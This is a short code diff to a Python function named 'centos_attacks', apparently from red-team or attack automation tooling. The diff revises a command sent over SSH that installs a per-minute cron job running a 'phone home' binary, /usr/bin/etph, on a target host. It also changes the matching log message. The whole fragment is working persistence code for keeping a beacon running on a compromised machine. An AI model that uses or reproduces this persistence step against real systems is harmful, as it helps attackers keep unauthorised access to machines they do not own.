@@ -279,8 +279,8 @@ def centos_attacks(host):
     log_line(ssh.before.decode('utf8'), host)
     
     ## Chown phone home
-    phonehome_crontab_cmd = r'echo -e "$(crontab -l)\n* * * * * /usr/bin/etph | crontab -"'
-    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | crontab -'
+    log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(phonehome_crontab_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
